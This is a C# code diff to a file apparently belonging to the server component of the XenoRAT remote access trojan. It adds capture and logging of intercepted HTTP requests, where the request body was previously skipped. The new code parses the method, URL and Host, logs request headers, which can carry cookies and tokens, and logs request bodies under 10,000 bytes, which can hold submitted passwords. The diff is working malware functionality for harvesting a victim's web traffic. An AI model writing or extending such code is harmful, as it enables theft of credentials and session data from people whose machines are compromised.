@@ -2132,6 +2132,12 @@ namespace xeno_rat_server.Forms
                 long? contentLength = null;
                 string contentEncoding = null;
 
+                bool requestHeadersParsed = false;
+                string requestMethod = null;
+                string requestUrl = null;
+                string requestHost = null;
+                MemoryStream requestHeaderBuf = isRequest ? new MemoryStream() : null;
+
                 try
                 {
                     while (!ct.IsCancellationRequested)
@@ -2163,7 +2169,59 @@ namespace xeno_rat_server.Forms
                         }
 
                         if (isRequest)
-                            continue; // Skip request body capture
+                        {
+                            // Accumulate request bytes until headers are parsed
+                            if (!requestHeadersParsed)
+                            {
+                                requestHeaderBuf.Write(buf, 0, bytesRead);
+                                string requestHeadersText = TryExtractHeaders(requestHeaderBuf.ToArray(), out int headersLength);
+                                if (requestHeadersText == null)
+                                    continue;
+
+                                requestHeadersParsed = true;
+
+                                // Parse first line (e.g., "GET /path HTTP/1.1")
+                                var firstLine = requestHeadersText.Split(new[] { "\r\n" }, StringSplitOptions.None)[0];
+                                var parts = firstLine.Split(' ');
+                                if (parts.Length >= 2)
+                                {
+                                    requestMethod = parts[0];
+                                    requestUrl = parts[1];
+                                }
+
+                                // Get Host header
+                                var matchHost = Regex.Match(requestHeadersText, @"Host:\s*(\S+)", RegexOptions.IgnoreCase);
+                                if (matchHost.Success)
+                                    requestHost = matchHost.Groups[1].Value;
+
+                                _log($"[HTTP Request] {requestMethod} {(requestHost != null ? $"https://{requestHost}{requestUrl}" : requestUrl)}");
+                                _log(Truncate(requestHeadersText, 1000));
+
+                                // Create buffer for request body (optional)
+                                var matchLen = Regex.Match(requestHeadersText, @"Content-Length:\s*(\d+)", RegexOptions.IgnoreCase);
+                                if (matchLen.Success)
+                                {
+                                    long reqContentLength = long.Parse(matchLen.Groups[1].Value);
+                                    bodyBuf = new MemoryStream();
+                                    if (requestHeaderBuf.Length > headersLength)
+                                    {
+                                        requestHeaderBuf.Position = headersLength;
+                                        await requestHeaderBuf.CopyToAsync(bodyBuf).ConfigureAwait(false);
+                                    }
+                                    requestHeaderBuf.Dispose();
+                                    requestHeaderBuf = null;
+
+                                    // If request body is small, log it
+                                    if (reqContentLength > 0 && reqContentLength < 10_000)
+                                    {
+                                        string bodyText = Encoding.UTF8.GetString(bodyBuf.ToArray());
+                                        _log($"HTTP Request Body (truncated):\n{Truncate(bodyText, 2000)}");
+                                    }
+                                }
+                            }
+
+                            continue; // Don't do response logic below
+                        }
 
                         // Accumulate header until parsed
                         if (!headersParsed)
